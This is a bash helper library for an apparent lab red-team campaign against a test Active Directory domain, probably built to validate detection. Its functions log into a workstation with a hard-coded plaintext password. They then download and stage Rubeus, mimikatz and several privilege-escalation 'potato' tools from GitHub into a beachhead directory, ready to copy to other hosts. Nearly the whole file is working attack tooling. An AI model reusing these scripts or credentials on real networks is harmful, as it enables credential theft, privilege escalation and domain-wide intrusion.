#!/usr/bin/env bash
# Shared helpers for Campaign A ws01-egress attacks (operator on provisioning .60)
set -euo pipefail

CAMPAIGN_A_LIB="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export PATH="${HOME}/.local/bin:${PATH}"

cadre_export() {
  local case_id="$1" t_attack="$2" t0="$3"
  local src_ip="${4:-192.168.77.62}"
  echo "=== Export ${case_id} source=${src_ip} ==="
  # Telemetry export to Elastic is deferred to Plan 1 phase 2 (elk/monitor VMs).
  # During attack-only validation we log the export parameters and continue.
  if [[ -x "${HOME}/cadre-es-export.sh" ]]; then
    echo "INFO: skipping ES export — attack-only stage"
  fi
  echo "EXPORT_LOG: case=${case_id} attack=${t_attack} t0=${t0} source=${src_ip}"
}

ws01_exec_as() {
  local user="$1" pass="$2" cmd="$3" domain="${4:-child.cadre.local}"
  WS01_AD_USER="${user}" WS01_AD_PASS="${pass}" WS01_DOMAIN="${domain}" \
    bash "${CAMPAIGN_A_LIB}/ws01-exec.sh" "${cmd}"
}

ws01_ensure_rubeus() {
  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
    'if (-not (Test-Path C:\Tools\cadre-attack)) { New-Item -ItemType Directory -Force -Path C:\Tools\cadre-attack | Out-Null }; if (-not (Test-Path C:\Tools\cadre-attack\Rubeus.exe)) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" -OutFile C:\Tools\cadre-attack\Rubeus.exe -UseBasicParsing }; if (Test-Path C:\Tools\cadre-attack\Rubeus.exe) { Write-Output OK:Rubeus } else { Write-Output FAIL:Rubeus; exit 1 }'
}

ws01_ensure_mimikatz() {
  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
    'if (-not (Test-Path C:\Tools\cadre-attack)) { New-Item -ItemType Directory -Force -Path C:\Tools\cadre-attack | Out-Null }; if (-not (Test-Path C:\Tools\cadre-attack\mimikatz.exe)) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile C:\Tools\cadre-attack\mimikatz.zip -UseBasicParsing; Expand-Archive -Force C:\Tools\cadre-attack\mimikatz.zip C:\Tools\cadre-attack\mimikatz; Copy-Item C:\Tools\cadre-attack\mimikatz\x64\mimikatz.exe C:\Tools\cadre-attack\mimikatz.exe }; if (Test-Path C:\Tools\cadre-attack\mimikatz.exe) { Write-Output OK:mimikatz } else { Write-Output FAIL:mimikatz; exit 1 }'
}

ws01_ensure_lpe_binaries() {
  # Ensure local LPE binaries are present on ws01 before copying to mbr01/dc02/etc.
  # Targets C:\Tools\ADTools (operator-managed staging directory on the initial beachhead).
  ws01_exec_as analyst_t1 'T13r_An@lyst!' \
    'Set-StrictMode -Version 2; $ErrorActionPreference = "Stop"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $dir = "C:\Tools\ADTools"; if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }; $tools = @{ "GodPotato-NET4.exe" = "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"; "PrintSpoofer64.exe" = "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"; "SweetPotato.exe" = "https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe"; "JuicyPotatoNG.zip" = "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip"; "RoguePotato.zip" = "https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip" }; function Ensure($name,$url) { $path = Join-Path $dir $name; if (Test-Path $path) { Write-Output "OK:$name"; return }; $tmp = "$path.tmp"; Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing; Move-Item $tmp $path -Force; if ($name -like "*.zip") { Expand-Archive -Force $path $dir; Write-Output "EXTRACTED:$name" } else { Write-Output "DOWNLOADED:$name" } }; foreach ($t in $tools.GetEnumerator()) { Ensure $t.Key $t.Value }; if (-not (Test-Path (Join-Path $dir "JuicyPotatoNG.exe"))) { Get-ChildItem $dir -Filter "JuicyPotatoNG*.exe" | Select-Object -First 1 | ForEach-Object { Copy-Item $_.FullName (Join-Path $dir "JuicyPotatoNG.exe") -Force; Write-Output "RENAME:JuicyPotatoNG.exe" } }; if (-not (Test-Path (Join-Path $dir "RoguePotato.exe"))) { Get-ChildItem $dir -Filter "RoguePotato.exe" -Recurse | Select-Object -First 1 | ForEach-Object { Copy-Item $_.FullName (Join-Path $dir "RoguePotato.exe") -Force; Write-Output "RENAME:RoguePotato.exe" } }; foreach ($n in @("GodPotato-NET4.exe","PrintSpoofer64.exe","SweetPotato.exe","JuicyPotatoNG.exe","RoguePotato.exe")) { if (Test-Path (Join-Path $dir $n)) { Write-Output "READY:$n" } else { Write-Output "MISSING:$n" } }'
}
